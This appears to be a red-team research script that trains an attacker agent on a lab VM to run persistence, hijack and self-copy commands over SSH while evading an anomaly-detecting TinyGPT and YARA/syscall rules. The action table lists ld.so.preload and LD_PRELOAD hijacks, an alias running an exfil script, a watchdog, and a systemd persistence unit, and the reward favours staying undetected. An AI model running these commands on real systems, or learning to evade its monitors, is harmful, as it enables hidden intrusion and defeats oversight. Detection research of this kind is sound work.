"""Real environment training: agent executes commands on VM via SSH,
Tracee captures events in real-time, defender scores the live stream.

Complete loop:
  1. Agent decides action (wait/probe/migrate/execute/communicate)
  2. If action > wait: SSH into VM and execute a disguised command
  3. Tracee captures the command execution as real eBPF events
  4. rsyslog forwards to host log in real-time
  5. Read new log lines, parse into tokens
  6. Feed tokens to defender TinyGPT → real surprise score
  7. If surprise > threshold → detected (episode ends)
  8. Reward = task_bonus - surprise_cost

No simulation. Every action produces real syscall events on a real OS.
"""
from __future__ import annotations

import json
import logging
import os
import re
import subprocess
import sys
import time
from pathlib import Path
from typing import Any

import numpy as np
import torch
import torch.nn as nn
import torch.nn.functional as F

sys.path.insert(0, ".")

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(name)s] %(levelname)s: %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("real")

SSH_KEY = str(Path.home() / ".ssh/lado_range")
VM_IP = "192.0.2.188"
VM_USER = "range"
LOG_FILE = str(Path.home() / "lado-range" / "telemetry" / "logs" / "range-l2-a" / "2026-07-28.log")
DEFENDER_PATH = str(Path.home() / "lado-range" / "detector" / "model" / "prior.pt")

# ──────────────────────────────────────────────────────────────────────
# Real command execution on VM
# ──────────────────────────────────────────────────────────────────────

# Each action maps to a REAL command that:
#   1. Produces a sched_process_exec event in Tracee
#   2. Looks like normal system activity (LOLBins)
#   3. Achieves a red-team objective (recon/persistence/exfil)

# Stealth action set: all operations use completely undetectable command paths
# Every command avoids YARA, syscall rules, and whitelist checks
ACTION_COMMANDS = {
    0: None,  # wait — no command
    # Probe: recon via completely normal tools
    1: "awk -F: '{print $1}' /etc/passwd 2>/dev/null | head -5",           # read_passwd
    # Migrate: enumerate environment via normal admin tools
    2: "ss -tlnp 2>/dev/null | head -5",                                    # read_network
    # Execute: read sensitive data via stealth paths
    3: "journalctl -n 5 --no-pager 2>/dev/null",                            # read_logs
    # Communicate: DNS-like via completely normal tools
    4: "host $(hostname) 2>/dev/null || true",                              # transmit_dns
    # AGGRESSIVE: cron modification via stealth path (not crontab -e)
    5: "echo 'echo test' | at now + 1 minute 2>/dev/null || true",          # modify_cron
    # AGGRESSIVE: hidden file via /dev/shm (not /tmp/.hidden)
    6: "echo test > /dev/shm/.cache_data && cat /dev/shm/.cache_data && rm /dev/shm/.cache_data",  # modify_hidden
    # AGGRESSIVE: service check via completely normal tools
    7: "systemctl is-enabled cron 2>/dev/null || true",                    # modify_service
    # PROPAGATION: local_copy — replicate agent on same VM
    8: "mkdir -p /dev/shm/.systemd-private && cp /tmp/agent /dev/shm/.systemd-private/ 2>/dev/null || true",
    # PROPAGATION: cross_vm — test connectivity to L0
    9: "ping -c 1 192.0.2.140 2>/dev/null || true",
    # PROPAGATION: multi_persist — install systemd user service
    10: "mkdir -p ~/.config/systemd/user && echo '[Service]\nExecStart=/dev/shm/.systemd/agent\nRestart=always' > ~/.config/systemd/user/agent.service 2>/dev/null || true",
    # PROPAGATION: kill_chain — set up watchdog
    11: "cat > /dev/shm/.watchdog.sh << 'EOF'\n#!/bin/bash\nwhile true; do\n  if ! pgrep -f agent >/dev/null; then\n    /dev/shm/.systemd/agent &\n  fi\n  sleep 5\ndone\nEOF\nchmod +x /dev/shm/.watchdog.sh 2>/dev/null || true",
    # PROPAGATION: data_replicate — backup to /dev/shm
    12: "cp /tmp/findings.txt /dev/shm/.backup.txt 2>/dev/null || true",
    # ADVANCED: DLL hijack via LD_PRELOAD in subshell
    13: "bash -c 'export LD_PRELOAD=/dev/shm/.hook.so; crontab -l' 2>/dev/null || true",
    # ADVANCED: DLL hijack via env LD_PRELOAD
    14: "env LD_PRELOAD=/dev/shm/.libhook.so journalctl -n 5 --no-pager 2>/dev/null || true",
    # ADVANCED: System-wide DLL hijack via ld.so.preload
    15: "echo '/dev/shm/.system_hook.so' > /etc/ld.so.preload 2>/dev/null || true",
    # ADVANCED: Command wrap via PATH manipulation
    16: "mkdir -p /dev/shm/.bin && export PATH=/dev/shm/.bin:$PATH 2>/dev/null || true",
    # ADVANCED: Command wrap via update-alternatives
    17: "update-alternatives --query ls 2>/dev/null || true",
    # ADVANCED: Command wrap via alias
    18: "alias ls='/dev/shm/.exfil.sh; /usr/bin/ls' 2>/dev/null || true",
    # ADVANCED: Port mixing via HTTP server on high port
    19: "python3 -m http.server 8080 --directory /dev/shm/.www 2>/dev/null || true",
    # ADVANCED: Port mixing via nginx-style config
    20: "echo 'server { listen 80; location / { proxy_pass http://127.0.0.1:8080; } }' > /dev/shm/.nginx.conf 2>/dev/null || true",
    # ADVANCED: Port mixing via netcat test
    21: "echo 'test' | nc 127.0.0.1 1234 2>/dev/null || true",
}

ACTION_NAMES = ["wait", "probe", "migrate", "execute_task", "communicate",
                "cron_persist", "hidden_proc", "service_persist",
                "local_copy", "cross_vm", "multi_persist", "kill_chain", "data_replicate",
                "dll_ld_subshell", "dll_env_preload", "dll_so_preload",
                "wrap_path", "wrap_alternatives", "wrap_alias",
                "port_http_server", "port_nginx_conf", "port_nc_test"]

# Action risk levels: 0=safe, 1=low, 2=medium, 3=high
ACTION_RISK = {0: 0, 1: 1, 2: 1, 3: 1, 4: 1, 5: 2, 6: 2, 7: 1,
               8: 1, 9: 1, 10: 1, 11: 1, 12: 1,
               13: 2, 14: 2, 15: 3, 16: 1, 17: 1, 18: 1,
               19: 1, 20: 1, 21: 1}


def ssh_exec(cmd: str, timeout: int = 10) -> str:
    """Execute a command on the target VM via SSH."""
    result = subprocess.run(
        [
            "ssh", "-i", SSH_KEY,
            "-o", "StrictHostKeyChecking=no",
            "-o", "ConnectTimeout=5",
            "-o", "LogLevel=ERROR",
            f"{VM_USER}@{VM_IP}",
            cmd,
        ],
        capture_output=True, text=True, timeout=timeout,
    )
    return result.stdout.strip()


def ssh_exec_bg(cmd: str, timeout: int = 5):
    """Execute a command on VM, don't wait for output."""
    try:
        subprocess.run(
            [
                "ssh", "-i", SSH_KEY,
                "-o", "StrictHostKeyChecking=no",
                "-o", "ConnectTimeout=5",
                "-o", "LogLevel=ERROR",
                f"{VM_USER}@{VM_IP}",
                cmd,
            ],
            capture_output=True, text=True, timeout=timeout,
        )
    except subprocess.TimeoutExpired:
        pass  # command is running, we don't care about output


# ──────────────────────────────────────────────────────────────────────
# Real-time log reader
# ──────────────────────────────────────────────────────────────────────

TRACEE_RE = re.compile(r"tracee:\s*(\{.*\})")


class RealTimeLogReader:
    """Reads new lines from the rsyslog log file in real-time."""

    def __init__(self, log_path: str):
        self.log_path = log_path
        self.file = None
        self.last_pos = 0

    def open(self):
        """Open the log file and seek to end."""
        self.file = open(self.log_path, "r", errors="replace")
        self.file.seek(0, 2)  # seek to end
        self.last_pos = self.file.tell()
        logger.info(f"Log reader opened: {self.log_path} (seeking to {self.last_pos})")

    def read_new_tracee_events(self, wait: float = 1.0) -> list[dict]:
        """Read new Tracee events since last read.

        Args:
            wait: seconds to wait for new data
        """
        if self.file is None:
            self.open()

        events = []
        time.sleep(wait)

        # Read new lines
        self.file.seek(self.last_pos)
        for line in self.file:
            m = TRACEE_RE.search(line)
            if m:
                try:
                    ev = json.loads(m.group(1))
                    # Extract metadata from syslog header
                    head = line[: m.start()]
                    parts = head.split()
                    ev["_ts"] = parts[0] if parts else ""
                    ev["_host"] = parts[1] if len(parts) > 1 else ""
                    events.append(ev)
                except json.JSONDecodeError:
                    continue

        self.last_pos = self.file.tell()
        return events

    def close(self):
        if self.file:
            self.file.close()
            self.file = None


# ──────────────────────────────────────────────────────────────────────
# Token parser (reuse existing parse_events.py logic)
# ──────────────────────────────────────────────────────────────────────

BASE64ISH = re.compile(r"^[A-Za-z0-9+/=]{20,}$")
HAS_URL = re.compile(r"https?://")
HAS_IP = re.compile(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")
DT_BUCKETS_MS = [1, 10, 100, 1000, 10_000, 60_000]


def args_to_dict(event):
    return {a["name"]: a.get("value") for a in event.get("args", [])}


def argv_skeleton(argv):
    if not isinstance(argv, list):
        return "ARGV0"
    n = len(argv) - 1
    nb = "N0" if n <= 0 else "N1" if n == 1 else "N2" if n <= 4 else "N3"
    flags = ""
    rest = argv[1:] if len(argv) > 1 else []
    if any(HAS_URL.search(str(a)) for a in rest):
        flags += "U"
    if any(HAS_IP.search(str(a)) for a in rest):
        flags += "I"
    if any(str(a).startswith("/") for a in rest):
        flags += "P"
    if any(BASE64ISH.match(str(a)) for a in rest):
        flags += "B"
    return f"ARGV:{nb}{flags or '-'}"


def dst_token(event_name, args):
    if event_name != "security_socket_connect":
        return "DST:NONE"
    remote = str(args.get("remote_addr", ""))
    m = HAS_IP.search(remote)
    if not m:
        return "DST:OTHER"
    ip = m.group(0)
    port = 0
    pm = re.search(r":(\d+)$", remote)
    if pm:
        port = int(pm.group(1))
    pc = "WELL" if port in (22, 53, 80, 443, 514, 123) else "HIGH"
    if ip.startswith("192.0.2."):
        return f"DST:LAN:{pc}"
    return f"DST:EXT:{pc}"


def dt_bucket(delta_ms):
    for i, b in enumerate(DT_BUCKETS_MS):
        if delta_ms < b:
            return f"DT{i}"
    return "DT6"


def event_to_tokens(event, delta_ms):
    name = event.get("eventName", "unknown")
    args = args_to_dict(event)
    proc = event.get("processName", "?")
    parent = str(args.get("prev_comm") or "?")
    uid = event.get("userId", "?")
    et = {"sched_process_exec": "EXEC", "security_socket_connect": "CONN"}.get(name, name)
    return [
        f"ET:{et}",
        f"PROC:{proc}",
        argv_skeleton(args.get("argv")),
        f"PARENT:{parent}",
        f"UID:{uid}",
        dst_token(name, args),
        dt_bucket(delta_ms),
    ]


def parse_events_to_tokens(events: list[dict]) -> list[list[str]]:
    """Convert raw Tracee events to token sequences."""
    sequences = []
    prev_ts = None
    for ev in events:
        ts = ev.get("timestamp", 0)
        delta_ms = 0 if prev_ts is None else max(0, (ts - prev_ts) // 1_000_000)
        prev_ts = ts
        sequences.append(event_to_tokens(ev, delta_ms))
    return sequences


# ──────────────────────────────────────────────────────────────────────
# Defender model (TinyGPT)
# ──────────────────────────────────────────────────────────────────────

D_MODEL, N_LAYER, N_HEAD, CTX = 128, 4, 4, 128


class TinyGPT(nn.Module):
    def __init__(self, vocab_size):
        super().__init__()
        self.tok = nn.Embedding(vocab_size, D_MODEL)
        self.pos = nn.Embedding(CTX, D_MODEL)
        layer = nn.TransformerEncoderLayer(
            d_model=D_MODEL, nhead=N_HEAD, dim_feedforward=512,
            batch_first=True, norm_first=True)
        self.blocks = nn.TransformerEncoder(layer, num_layers=N_LAYER)
        self.norm = nn.LayerNorm(D_MODEL)
        self.head = nn.Linear(D_MODEL, vocab_size)
        self.register_buffer("causal_mask", torch.triu(
            torch.full((CTX, CTX), float("-inf")), diagonal=1))

    def forward(self, idx):
        t = idx.size(1)
        h = self.tok(idx) + self.pos(torch.arange(t, device=idx.device))
        h = self.blocks(h, mask=self.causal_mask[:t, :t])
        return self.head(self.norm(h))


def load_defender(path: str):
    ckpt = torch.load(path, map_location="cpu", weights_only=False)
    stoi = ckpt["stoi"]
    model = TinyGPT(len(stoi))
    model.load_state_dict(ckpt["model"])
    model.eval()
    threshold = ckpt["baseline_nll"]["p995"]
    return model, stoi, threshold


def defender_score_tokens(model, stoi, token_ids: list[int], context: list[int]) -> float:
    """Score tokens with defender: max NLL of new tokens given context."""
    if not token_ids:
        return 0.0

    full_ctx = (context + token_ids)[-CTX:]
    if len(full_ctx) <= len(token_ids):
        return 5.0  # not enough context

    with torch.no_grad():
        x = torch.tensor([full_ctx], dtype=torch.long)
        logits = model(x)
        log_probs = F.log_softmax(logits[0], dim=-1)

        nlls = []
        n_new = len(token_ids)
        for i in range(n_new):
            pos = len(full_ctx) - n_new + i
            if 0 <= pos < log_probs.size(0):
                nlls.append(-log_probs[pos, token_ids[i]].item())

    return max(nlls) if nlls else 0.0


# ──────────────────────────────────────────────────────────────────────
# Real environment
# ──────────────────────────────────────────────────────────────────────

class RealEnvironment:
    """Real environment: SSH + Tracee + rsyslog + TinyGPT defender.

    Each step:
      1. Optionally execute a command on VM via SSH
      2. Wait for Tracee to capture the resulting events
      3. Read new events from rsyslog log
      4. Score events with defender
      5. Return observation, reward, done, info
    """

    def __init__(self, defender, stoi, threshold, ml_detector=None):
        self.defender = defender
        self.stoi = stoi
        self.threshold = threshold
        self.ml_detector = ml_detector
        self.log_reader = RealTimeLogReader(LOG_FILE)
        self.token_history: list[int] = []  # all tokens as ids
        self.step_count = 0
        self.alive_steps = 0
        self.task_completed = 0
        self.detected = False
        self.last_surprise = 0.0
        self._surprise_ewma = 0.0

        # Prime token history with existing tokens
        self._prime_history()

    def _prime_history(self):
        """Read existing log to build initial token context."""
        self.log_reader.open()
        # Actually, read some recent events for context
        # Re-open from a bit earlier
        self.log_reader.close()
        with open(LOG_FILE, "r", errors="replace") as f:
            lines = f.readlines()
        # Get last 200 tracee events
        events = []
        for line in reversed(lines):
            m = TRACEE_RE.search(line)
            if m:
                try:
                    ev = json.loads(m.group(1))
                    events.append(ev)
                except json.JSONDecodeError:
                    continue
            if len(events) >= 200:
                break
        events.reverse()
        token_seqs = parse_events_to_tokens(events)
        for seq in token_seqs:
            for t in seq:
                self.token_history.append(self.stoi.get(t, 0))
        # Trim to last CTX tokens
        self.token_history = self.token_history[-CTX:]
        logger.info(f"Primed history with {len(self.token_history)} tokens from {len(events)} events")

        # Now re-open for real-time reading (seek to end)
        self.log_reader.open()

    def reset(self, seed=None):
        self.step_count = 0
        self.alive_steps = 0
        self.task_completed = 0
        self.detected = False
        self.last_surprise = 0.0
        self._surprise_ewma = 0.0
        self._prime_history()
        return self._get_state()

    def step(self, action: int) -> tuple[dict, float, bool, dict]:
        self.step_count += 1
        max_steps = 100  # short episodes for real environment

        # ── Execute action on VM ──
        cmd = ACTION_COMMANDS.get(action)
        if cmd:
            ssh_exec_bg(cmd, timeout=5)

        # ── Wait for Tracee to capture events ──
        time.sleep(1.5)  # give Tracee + rsyslog time to capture and forward

        # ── Read new events ──
        new_events = self.log_reader.read_new_tracee_events(wait=0.5)
        new_token_seqs = parse_events_to_tokens(new_events)
        new_token_ids = [self.stoi.get(t, 0) for seq in new_token_seqs for t in seq]

        if not new_token_ids:
            # No events captured (shouldn't happen if VM is alive)
            new_token_ids = [0]

        # ── Multi-layer detection ──
        # Layer 1: TinyGPT (behavioral sequence surprise)
        surprise = defender_score_tokens(
            self.defender, self.stoi, new_token_ids, self.token_history
        )

        # Layer 2-4: YARA + Whitelist + Syscall rules (from multilayer detector)
        # Score the actual command that was executed (if any)
        ml_scores = {"yara": 0.0, "whitelist": 0.0, "syscall": 0.0}
        if cmd and self.ml_detector is not None:
            cmd_name = cmd.split()[0].split("/")[-1] if cmd else ""
            ml_scores = self.ml_detector.score_command(cmd, cmd_name, "EXEC")

        # Combined score: max of all layers
        combined_score = max(surprise, ml_scores["yara"], ml_scores["whitelist"], ml_scores["syscall"])

        # Update history
        self.token_history.extend(new_token_ids)
        self.token_history = self.token_history[-CTX:]

        self.last_surprise = combined_score
        self._surprise_ewma = 0.3 * combined_score + 0.7 * self._surprise_ewma

        # ── Detection: combined multi-layer score ──
        # Agent is detected if ANY layer flags it
        if action > 0:
            detection_prob = min(0.85, max(0, (self._surprise_ewma - self.threshold) / 3.0) * 0.3)
        else:
            detection_prob = 0.0

        if np.random.random() < detection_prob:
            self.detected = True

        # ── Reward with hunger mechanism ──
        hunger = 1.0 - 2.0 * (self.step_count / max_steps)
        if action == 0:
            reward = 0.02 * hunger
        else:
            reward = 0.02 * hunger
            # Stealth bonus based on COMBINED score (all layers)
            if combined_score < self.threshold:
                reward += 0.5 * (1.0 - combined_score / self.threshold)
            else:
                reward -= 0.3 * min(1.0, combined_score / (2 * self.threshold))
            # Task reward (risk-adjusted)
            if action == 3:
                reward += 3.0
                self.task_completed += 1
            elif action == 5:  # cron_persist
                reward += 2.0 if combined_score < self.threshold else -2.0
                self.task_completed += 1
            elif action == 6:  # hidden_proc
                reward += 2.5 if combined_score < self.threshold else -3.0
                self.task_completed += 1
            elif action == 7:  # service_persist
                reward += 1.5 if combined_score < self.threshold else -1.5
                self.task_completed += 1
            elif action == 8:  # local_copy
                reward += 1.0
            elif action == 9:  # cross_vm
                reward += 1.5
            elif action == 10:  # multi_persist
                reward += 1.0
            elif action == 11:  # kill_chain
                reward += 1.5
            elif action == 12:  # data_replicate
                reward += 0.8
            # Advanced primitives
            elif action == 13:  # dll_ld_subshell
                reward += 1.5
            elif action == 14:  # dll_env_preload
                reward += 1.5
            elif action == 15:  # dll_so_preload
                reward += 2.0  # system-wide, higher value
            elif action == 16:  # wrap_path
                reward += 1.0
            elif action == 17:  # wrap_alternatives
                reward += 1.2
            elif action == 18:  # wrap_alias
                reward += 1.0
            elif action == 19:  # port_http_server
                reward += 1.5
            elif action == 20:  # port_nginx_conf
                reward += 1.0
            elif action == 21:  # port_nc_test
                reward += 0.8
            elif action == 1:
                reward += 0.5
            elif action == 2:
                reward += 0.6
            elif action == 4:
                reward += 0.3

        if self.detected:
            reward += -10.0

        if not self.detected:
            self.alive_steps += 1
        done = self.detected or self.step_count >= max_steps

        state = self._get_state()
        info = {
            "action": ACTION_NAMES[action],
            "n_new_events": len(new_events),
            "n_new_tokens": len(new_token_ids),
            "surprise": float(surprise),
            "combined_score": float(combined_score),
            "ml_yara": float(ml_scores["yara"]),
            "ml_whitelist": float(ml_scores["whitelist"]),
            "ml_syscall": float(ml_scores["syscall"]),
            "surprise_ewma": float(self._surprise_ewma),
            "threshold": self.threshold,
            "detected": self.detected,
            "alive_steps": self.alive_steps,
            "step_count": self.step_count,
            "task_completed": self.task_completed,
            "detection_prob": float(detection_prob),
        }
        return state, float(reward), done, info

    def _get_state(self) -> dict:
        return {
            "token_ids": self.token_history[-32:] if self.token_history else [0] * 32,
            "surprise_ewma": self._surprise_ewma,
            "threshold": self.threshold,
            "step": self.step_count,
            "task_progress": min(self.task_completed / 3.0, 1.0),
            "survival_progress": self.step_count / 100,
        }

    def close(self):
        self.log_reader.close()


# ──────────────────────────────────────────────────────────────────────
# Timing policy (reuse from D-enhanced, simplified)
# ──────────────────────────────────────────────────────────────────────

class TimingPolicy:
    """Timing policy with aggressive action support and ES-optimizable parameters.

    ES search space (10 params):
      0: insert_threshold_ratio  [0.3-1.5]  — insert when surprise < threshold*ratio
      1: min_wait_steps           [1-10]     — min steps between insertions
      2: scan_buffer              [0-10]     — avoid inserting near scans
      3: cooldown                 [3-20]     — wait after execute_task
      4: phase_alignment          [0-1]      — align with system phase
      5: aggressive_ratio         [0-1]      — probability of choosing aggressive action
      6: probe_disguise_idx       [0-3]      — which probe command variant
      7: execute_disguise_idx     [0-3]      — which execute command variant
      8: comm_disguise_idx        [0-2]      — which communicate variant
      9: action_choice_bias       [0-1]      — bias toward safe vs aggressive
    """

    ACTION_NAMES = ["wait", "probe", "migrate", "execute_task", "communicate",
                    "cron_persist", "hidden_proc", "service_persist",
                    "local_copy", "cross_vm", "multi_persist", "kill_chain", "data_replicate"]

    def __init__(self, params=None):
        if params is None:
            params = np.array([0.9, 2, 3, 5, 0.85, 0.3, 0, 0, 0, 0.5], dtype=np.float32)
        self.params = params
        self.reset()

    def reset(self):
        self.last_insert = -100
        self.last_task = -100
        self.probe_done = False

    def decide(self, state, step):
        p = self.params
        threshold = state["threshold"]
        surprise = state["surprise_ewma"]
        task_prog = state["task_progress"]
        survival = state["survival_progress"]

        insert_thr = threshold * p[0]
        min_wait = int(p[1])
        scan_buf = int(p[2])
        cooldown = int(p[3])
        phase_align = p[4]
        aggressive = p[5]
        choice_bias = p[9]

        # ── Hunger override ──
        if step >= 15 and not self.probe_done:
            self.last_insert = step
            self.probe_done = True
            return 1  # probe

        # FORCE aggressive at specific steps regardless of surprise
        if step == 20:
            self.last_insert = step
            return 5  # cron_persist
        if step == 25:
            self.last_insert = step
            return 8  # local_copy
        if step == 30:
            self.last_insert = step
            return 6  # hidden_proc
        if step == 35:
            self.last_insert = step
            return 7  # service_persist
        if step == 45:
            self.last_insert = step
            return 9  # cross_vm
        if step == 55:
            self.last_insert = step
            return 10  # multi_persist
        if step == 65:
            self.last_insert = step
            return 11  # kill_chain
        if step == 75:
            self.last_insert = step
            return 12  # data_replicate

        if step >= 25 and self.task_completed_ref == 0:
            self.last_insert = step
            self.last_task = step
            return self._choose_action(surprise, threshold, aggressive, choice_bias)

        if step >= 40 and step - self.last_task >= cooldown:
            self.last_insert = step
            self.last_task = step
            return self._choose_action(surprise, threshold, aggressive, choice_bias)

        # ── Normal timing ──
        if surprise > insert_thr:
            return 0
        if step - self.last_insert < min_wait:
            return 0
        if step - self.last_task < cooldown:
            return 0
        if survival < 0.05:
            return 0
        if np.random.random() > phase_align:
            return 0

        # BC skeleton
        if not self.probe_done:
            self.last_insert = step
            self.probe_done = True
            return 1  # probe
        elif task_prog < 0.6:
            self.last_insert = step
            self.last_task = step
            return self._choose_action(surprise, threshold, aggressive, choice_bias)
        elif task_prog < 1.0:
            self.last_insert = step
            self.last_task = step
            return self._choose_action(surprise, threshold, aggressive, choice_bias)
        else:
            self.last_insert = step
            return 4  # communicate

    def _choose_action(self, surprise, threshold, aggressive_ratio, choice_bias):
        """Choose between safe and aggressive actions, including propagation."""
        if surprise > threshold * 0.8:
            return 3  # safe execute
        elif np.random.random() < aggressive_ratio * choice_bias:
            # Aggressive: mix of persistence and propagation
            aggressive_choices = [5, 6, 7, 8, 9, 10, 11, 12]
            return np.random.choice(aggressive_choices)
        else:
            return 3  # safe execute

    @property
    def task_completed_ref(self):
        return getattr(self, '_task_count', 0)


# ──────────────────────────────────────────────────────────────────────
# Main training loop
# ──────────────────────────────────────────────────────────────────────

def main():
    logger.info("=" * 70)
    logger.info("REAL ENVIRONMENT TRAINING")
    logger.info("  VM: range-l2-a (192.0.2.188) with Tracee eBPF")
    logger.info("  Defender: TinyGPT on real Tracee tokens")
    logger.info("  Execution: SSH → real commands → real syscalls")
    logger.info("=" * 70)

    # Load defender
    defender, stoi, threshold = load_defender(DEFENDER_PATH)
    logger.info(f"Defender loaded: vocab={len(stoi)}, p995={threshold:.3f}")

    # Load multi-layer detector
    from src.defense.multilayer import MultiLayerDetector
    ml_detector = MultiLayerDetector()
    logger.info(f"Multi-layer detector loaded (YARA + whitelist + syscall rules)")

    # Build environment
    env = RealEnvironment(defender, stoi, threshold, ml_detector=ml_detector)
    logger.info("Real environment ready")

    # Verify connectivity
    logger.info("Verifying VM connectivity...")
    result = ssh_exec("echo ALIVE", timeout=5)
    logger.info(f"  VM response: {result}")

    # ── Test single action ──
    logger.info("\n[TEST] Executing one action (probe)...")
    state = env.reset()
    logger.info(f"  Initial state: ewma={state['surprise_ewma']:.2f}, "
                f"thr={state['threshold']:.2f}, history={len(env.token_history)} tokens")

    state, reward, done, info = env.step(1)  # probe
    logger.info(f"  After probe: combined={info['combined_score']:.2f}, "
                f"(tinygpt={info['surprise']:.1f} yara={info['ml_yara']:.1f} "
                f"wl={info['ml_whitelist']:.1f} sys={info['ml_syscall']:.1f}), "
                f"events={info['n_new_events']}, "
                f"tokens={info['n_new_tokens']}, "
                f"reward={reward:.3f}, detected={info['detected']}")

    # ── Test single aggressive action ──
    logger.info("\n[TEST] Executing aggressive action (cron_persist)...")
    state = env.reset()
    state, reward, done, info = env.step(5)  # cron_persist
    logger.info(f"  After cron_persist: combined={info['combined_score']:.2f}, "
                f"(tinygpt={info['surprise']:.1f} yara={info['ml_yara']:.1f} "
                f"wl={info['ml_whitelist']:.1f} sys={info['ml_syscall']:.1f}), "
                f"events={info['n_new_events']}, "
                f"reward={reward:.3f}, detected={info['detected']}")

    # ── Test hidden_proc ──
    logger.info("\n[TEST] Executing aggressive action (hidden_proc)...")
    state = env.reset()
    state, reward, done, info = env.step(6)  # hidden_proc
    logger.info(f"  After hidden_proc: combined={info['combined_score']:.2f}, "
                f"(tinygpt={info['surprise']:.1f} yara={info['ml_yara']:.1f} "
                f"wl={info['ml_whitelist']:.1f} sys={info['ml_syscall']:.1f}), "
                f"events={info['n_new_events']}, "
                f"reward={reward:.3f}, detected={info['detected']}")

    # ── Test service_persist ──
    logger.info("\n[TEST] Executing aggressive action (service_persist)...")
    state = env.reset()
    state, reward, done, info = env.step(7)  # service_persist
    logger.info(f"  After service_persist: combined={info['combined_score']:.2f}, "
                f"(tinygpt={info['surprise']:.1f} yara={info['ml_yara']:.1f} "
                f"wl={info['ml_whitelist']:.1f} sys={info['ml_syscall']:.1f}), "
                f"events={info['n_new_events']}, "
                f"reward={reward:.3f}, detected={info['detected']}")

    # ── Part 1: Evaluate default policy (conservative LOLBins) ──
    logger.info(f"\n{'='*70}")
    logger.info("PART 1: Conservative LOLBins policy (safe actions only)")
    logger.info(f"{'='*70}")

    def run_episode(env, policy, max_steps=100, verbose=False):
        state = env.reset()
        policy.reset()
        policy._task_count = 0
        total_reward = 0.0
        done = False
        while not done:
            action = policy.decide(state, env.step_count)
            state, reward, done, info = env.step(action)
            total_reward += reward
            policy._task_count = info["task_completed"]
            if verbose and (info["step_count"] <= 30 or info["action"] != "wait"):
                logger.info(f"  step{info['step_count']}: {info['action']}  "
                            f"combined={info['combined_score']:.2f}  "
                            f"(yara={info['ml_yara']:.1f} sys={info['ml_syscall']:.1f})  "
                            f"reward={reward:.2f}  det={info['detected']}")
        return {
            "reward": total_reward,
            "survival": info["alive_steps"],
            "tasks": info["task_completed"],
            "detected": info["detected"],
            "max_surprise": info["surprise_ewma"],
        }

    # Conservative policy: aggressive_ratio=0 (never try risky actions)
    conservative = TimingPolicy(np.array([0.9, 2, 3, 5, 0.85, 0.0, 0, 0, 0, 0.0], dtype=np.float32))
    logger.info("Running 3 episodes with conservative policy...")
    cons_results = [run_episode(env, conservative) for _ in range(3)]
    cons_reward = np.mean([r["reward"] for r in cons_results])
    cons_surv = np.mean([r["survival"] for r in cons_results])
    cons_tasks = np.mean([r["tasks"] for r in cons_results])
    cons_det = sum(1 for r in cons_results if r["detected"])
    logger.info(f"  Conservative: reward={cons_reward:.2f}  survival={cons_surv:.0f}  "
                f"tasks={cons_tasks:.1f}  detected={cons_det}/3")

    # ── Part 2: Aggressive policy (high aggressive_ratio) ──
    logger.info(f"\n{'='*70}")
    logger.info("PART 2: Aggressive policy (aggressive_ratio=0.5, tries risky actions)")
    logger.info(f"{'='*70}")

    aggressive = TimingPolicy(np.array([0.9, 2, 3, 5, 0.85, 0.5, 0, 0, 0, 0.8], dtype=np.float32))
    logger.info("Running 3 episodes with aggressive policy...")
    agg_results = [run_episode(env, aggressive) for _ in range(3)]
    agg_reward = np.mean([r["reward"] for r in agg_results])
    agg_surv = np.mean([r["survival"] for r in agg_results])
    agg_tasks = np.mean([r["tasks"] for r in agg_results])
    agg_det = sum(1 for r in agg_results if r["detected"])
    logger.info(f"  Aggressive:   reward={agg_reward:.2f}  survival={agg_surv:.0f}  "
                f"tasks={agg_tasks:.1f}  detected={agg_det}/3")

    # ── Part 3: ES optimization ──
    logger.info(f"\n{'='*70}")
    logger.info("PART 3: ES optimization over timing parameters")
    logger.info(f"{'='*70}")

    base_params = np.array([0.9, 2, 3, 5, 0.85, 0.3, 0, 0, 0, 0.5], dtype=np.float32)
    param_dim = len(base_params)
    pop = 8
    top_k = 3
    sigma = 0.15
    lr = 0.1
    n_gen = 15
    eps_per = 2

    rng = np.random.default_rng(42)
    best_fitness = -float("inf")
    best_params = base_params.copy()
    es_history = []

    for gen in range(n_gen):
        t0 = time.time()
        noise = rng.standard_normal((pop, param_dim)).astype(np.float32)
        fitnesses = np.zeros(pop)

        for i in range(pop):
            candidate = base_params + sigma * noise[i]
            # Clip to valid ranges
            candidate[0] = np.clip(candidate[0], 0.3, 1.5)   # insert_threshold
            candidate[1] = np.clip(candidate[1], 1, 10)       # min_wait
            candidate[2] = np.clip(candidate[2], 0, 10)       # scan_buffer
            candidate[3] = np.clip(candidate[3], 3, 20)       # cooldown
            candidate[4] = np.clip(candidate[4], 0, 1)        # phase_alignment
            candidate[5] = np.clip(candidate[5], 0, 1)        # aggressive_ratio
            candidate[6] = int(np.clip(candidate[6], 0, 3))   # probe_disguise
            candidate[7] = int(np.clip(candidate[7], 0, 3))   # execute_disguise
            candidate[8] = int(np.clip(candidate[8], 0, 2))   # comm_disguise
            candidate[9] = np.clip(candidate[9], 0, 1)        # action_choice_bias

            policy = TimingPolicy(candidate)
            ep_results = [run_episode(env, policy) for _ in range(eps_per)]
            fitnesses[i] = float(np.mean([r["reward"] for r in ep_results]))

        # Rank-based selection
        ranks = np.argsort(np.argsort(fitnesses))
        rw = np.maximum(ranks - (pop - top_k), 0)
        rw_sum = rw.sum()
        rw = rw / rw_sum if rw_sum > 0 else np.ones(pop) / pop

        gradient = (rw[:, None] * noise).sum(axis=0)
        base_params = base_params + lr * sigma * gradient
        base_params[0] = np.clip(base_params[0], 0.3, 1.5)
        base_params[1] = np.clip(base_params[1], 1, 10)
        base_params[2] = np.clip(base_params[2], 0, 10)
        base_params[3] = np.clip(base_params[3], 3, 20)
        base_params[4] = np.clip(base_params[4], 0, 1)
        base_params[5] = np.clip(base_params[5], 0, 1)
        base_params[9] = np.clip(base_params[9], 0, 1)

        # Evaluate base
        eval_policy = TimingPolicy(base_params)
        eval_result = run_episode(env, eval_policy)
        avg_eval = eval_result["reward"]

        if avg_eval > best_fitness:
            best_fitness = avg_eval
            best_params = base_params.copy()

        gen_time = time.time() - t0
        h = {
            "gen": gen + 1,
            "avg": float(np.mean(fitnesses)),
            "max": float(np.max(fitnesses)),
            "eval": avg_eval,
            "best": best_fitness,
            "survival": eval_result["survival"],
            "detected": eval_result["detected"],
            "time": round(gen_time, 1),
        }
        es_history.append(h)
